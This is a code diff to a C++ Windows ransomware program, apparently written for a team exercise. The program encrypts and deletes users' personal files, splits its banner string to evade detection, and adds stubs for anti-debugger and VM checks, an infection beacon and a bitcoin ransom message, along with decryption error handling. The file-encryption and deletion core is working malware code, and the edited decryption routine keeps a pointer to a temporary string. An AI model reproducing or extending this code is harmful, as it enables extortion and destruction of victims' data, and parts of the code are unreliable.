@@ -32,8 +32,10 @@ bool DecryptThisFile(std::string path, std::string decryptionKey);
 bool ExcludePath(std::string checkString);
 bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
 bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
-void SendBeacon();
+void SendInfectionBeacon();
 void RansomMessage();
+bool AnalysisCheck();
+void PrintProgress();
 
 int main(int argc, char* argv[])
 { 
@@ -49,12 +51,31 @@ int main(int argc, char* argv[])
 	std::string Banner9 = "at";
 	std::string Banner10 = "ri";
 	std::string Banner11 = "x!";
-	std::string Banner12 = "!!";
-	std::string Banner13 = " ...";
-	// Obfuscating this string
-	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11).append(Banner12).append(Banner13);
+	//std::string Banner12 = "!!";
+	//std::string Banner13 = " ...";
 
-    std::cout << BannerFinal << std::endl;
+	// Obfuscating this string
+	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11); // .append(Banner12).append(Banner13);
+	std::cout << BannerFinal << std::endl;
+
+	//for (int i = 0; i < 6; i++)
+	//{
+	//	std::cout << ".";
+	//	Sleep(250);
+	//}
+	//std::cout << "." << std::endl;
+
+	DWORD dwDecryptionResult = 0;
+	
+	//
+	// Check for debugger, execution in a VM, or other dynamic analysis 
+	//
+	if (AnalysisCheck())
+	{
+		// Found evidence of some kind of dynamic analysis
+		// Halting program execution - why make it easy on the other teams?? :)
+		return 0;
+	}
 
 	for (int i = 1; i < argc; ++i) {
 		if (std::string(argv[i]) == "/v") 
@@ -81,50 +102,92 @@ int main(int argc, char* argv[])
 
 	if (g_Verbosity)
 	{
-		std::cout << "Verbosity: Enabled" << std::endl;
-		std::cout << "Decrypt: " << g_Decrypt << "  [1: Enalbed; 0: Disabled]" << std::endl;
+		std::cout << "Verbosity:  Enabled" << std::endl;
+		std::cout << "Operation:  " << g_Decrypt << "  [1: Decrypt; 0: Encrypt]" << std::endl;
 		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
+		std::cout << std::endl;
 	}
 
 	// Encrypt or Decrypt files?
 	if (!g_Decrypt)
 	{
+		PrintProgress();
+
 		// Finds, Encrypts, and Deletes important personal files
 		FindFiles();
+
+		// Send network beacon to report ransom/encryption completed
+		SendInfectionBeacon();
+
+		// Display message to user demanding bitcoin payment for decryption key
+		RansomMessage();
 	}
 	else
 	{
 		// Finds .encrypted files, and decrypts them
-		std::cout << "You entered the decryption key: " << keyDecrypt << std::endl;
+		std::cout << "You entered the password: " << keyDecrypt << std::endl;// << std::endl;
 
-		FindEncryptedFiles(keyDecrypt);
+		PrintProgress();
+
+		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
+		if (dwDecryptionResult > 0)
+		{
+			std::cout << "< " << std::dec << dwDecryptionResult <<" > files failed to recover.  Rerun the program with your password." << " [0x" << std::hex << dwDecryptionResult << "]" << std::endl;
+		}
 	}
 
-	// Send network beacon to report ransom completed
-	SendBeacon();
 
-	// Display message to user demanding bitcoin payment 
-	RansomMessage();
-
-	// Question: Do we care about providing a decryption option?
-
-	// Question: For the final version, I think we should comment out all 
-	// of the std::cout calls in all supporting functions to minimize the 
-	// discoverable strings.  Thoughts?
-
+	// End with a fun message
 	if (!g_Decrypt)
 	{
 		std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
 	}
 	else
 	{
-		std::cout << std::endl << "All Your Files Are Belong To You!!! :\\" << std::endl;
+		if (dwDecryptionResult > 0)
+		{
+			std::cout << std::endl << "Not All Your Files Are Belong To You!!! :<" << std::endl;
+		}
+		else
+		{
+			std::cout << std::endl << "All Your Files Are Belong To You!!! :>" << std::endl;
+		}
 	}
 }
 
 //
 // Supporting functions
 //
+
+bool AnalysisCheck()
+{
+	// TODO: Add code to check for a debugger, execution in a VM, or other dynamic analysis
+
+	return false; // stubbed for now allow execution
+}
+
+void SendInfectionBeacon()
+{
+	// TODO: Add code to send an infection beacon to a website, twitter, 
+	//       slack, email, or some other network destination
+}
+
+void RansomMessage()
+{
+	// TODO: Add code to display a ransom message to the user, and to 
+	//       demand bitcoin payment to get the decryption key
+}
+
+void PrintProgress()
+{
+	Sleep(150);
+	for (int i = 0; i < 6; i++)
+	{
+		std::cout << ".";
+		Sleep(200);
+	}
+	std::cout << "." << std::endl;
+}
 
 bool ExcludePath(std::string checkString)
 {
@@ -301,10 +364,9 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key)
 {
 
-	// Note: the param 'key' is not used anywhere - it is a false flag
-
-	wchar_t keyDefault[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
-	wchar_t* keyString = keyDefault;
+	// Note: the param 'key' is the actual key used for file decryption !!
+	
+	LPCWSTR keyString = std::wstring(key.begin(), key.end()).c_str();
 	DWORD keyLength = lstrlenW(keyString);
 
 	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
@@ -313,7 +375,7 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 
 	if (g_Verbosity)
 	{
-		std::wcout << "Key:         " << keyDefault << std::endl;
+		std::wcout << "Key:         " << key.c_str() << std::endl;
 		std::cout << "Key (addr):  " << keyString << std::endl;
 		std::cout << "Key length:  " << keyLength << std::endl;
 		std::cout << "Input file:  " << fileToDecrypt.c_str() << std::endl;
@@ -397,6 +459,7 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	BOOL isFinal = FALSE;
 	DWORD readTotalSize = 0;
 	DWORD inputSize = GetFileSize(hInputFile, NULL);
+	bool retValue = true;
 
 	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL))
 	{
@@ -411,14 +474,33 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 		{
 			isFinal = TRUE;
 			if (g_Verbosity)
-				std::cout << "Finalizing encrypted data file." << std::endl;
+				std::cout << "Finalizing decrypted data file." << std::endl;
 		}
 
 		// Decrypt data
 		if (!CryptDecrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength))
 		{
 			if (g_Verbosity)
+			{
 				std::cout << "CryptDecrypt  failed :(" << std::endl;
+				DWORD dwStatus;
+				dwStatus = GetLastError();
+
+				LPVOID lpMsgBuf;
+				FormatMessage(
+					FORMAT_MESSAGE_ALLOCATE_BUFFER |
+					FORMAT_MESSAGE_FROM_SYSTEM |
+					FORMAT_MESSAGE_IGNORE_INSERTS,
+					NULL,
+					dwStatus,
+					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+					(LPTSTR)& lpMsgBuf,
+					0, NULL);
+
+				std::cout << "CryptDecrypt status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+				std::wcout << "CryptDecrypt error:  " << (LPTSTR)lpMsgBuf;
+			}
+			retValue = false;
 			break;
 		}
 
@@ -427,6 +509,7 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 		{
 			if (g_Verbosity)
 				std::cout << "WriteFile(output file) failed :(" << std::endl;
+			retValue = false;
 			break;
 		}
 
@@ -439,7 +522,7 @@ bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string 
 	CloseHandle(hInputFile);
 	CloseHandle(hOutputFile);
 
-	return true;
+	return retValue;
 }
 
 bool EncryptAndDeleteThisFile(std::string path)
@@ -458,18 +541,23 @@ bool EncryptAndDeleteThisFile(std::string path)
 	if (g_Verbosity)
 		std::cout << "Encrypt result: " << fEncrypted << std::endl;
 
-	fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
-	if (!fDeleted)
+	if (fEncrypted)
 	{
-		DWORD dwStatus;
-		dwStatus = GetLastError();
-		if (g_Verbosity)
-			std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
-	}
-	else
-	{
-		if (g_Verbosity)
-			std::cout << "Delete result:  " << fDeleted << std::endl;
+		// Only delete original file if Encryption succeeded 
+
+		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
+		if (!fDeleted)
+		{
+			DWORD dwStatus;
+			dwStatus = GetLastError();
+			if (g_Verbosity)
+				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+		}
+		else
+		{
+			if (g_Verbosity)
+				std::cout << "Delete result:  " << fDeleted << std::endl;
+		}
 	}
 
 	if (g_Verbosity)
@@ -497,23 +585,27 @@ bool DecryptThisFile(std::string path, std::string decryptionKey)
 	if (g_Verbosity)
 	{
 		std::cout << "Decryption result: " << fDecrypted << std::endl;
-		//std::cout << "Restore target file path: " << pathRestoreTargetFile << std::endl;
+		std::cout << "Restored file:  " << pathRestoreTargetFile << std::endl;
 	}
 
-	//TODO : if fDecrypted do delete
-	//fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
-	//if (!fDeleted)
-	//{
-	//	DWORD dwStatus;
-	//	dwStatus = GetLastError();
-	//	if (g_Verbosity)
-	//		std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
-	//}
-	//else
-	//{
-	//	if (g_Verbosity)
-	//		std::cout << "Delete result:  " << fDeleted << std::endl;
-	//}
+	if (fDecrypted)
+	{
+		// Only delete encrypted file if Decryption succeeded 
+
+		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
+		if (!fDeleted)
+		{
+			DWORD dwStatus;
+			dwStatus = GetLastError();
+			if (g_Verbosity)
+				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+		}
+		else
+		{
+			if (g_Verbosity)
+				std::cout << "Delete result:  " << fDeleted << std::endl;
+		}
+	}
 
 	if (g_Verbosity)
 		std::cout << std::endl;
@@ -673,19 +765,10 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 
 	if (g_Verbosity)
 	{
-		std::cout << "Total files found:     " << dwFileCounter << std::endl;
-		std::cout << "Total files decrypted: " << dwDecryptionCounter << std::endl;
+		std::cout << "Total files found:     " << std::dec << dwFileCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
+		std::cout << "Total files decrypted: " << std::dec << dwDecryptionCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
 	}
 
-	return dwFileCounter;
+	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
 }
 
-void SendBeacon()
-{
-	// TODO
-}
-
-void RansomMessage()
-{
-	// TODO
-}
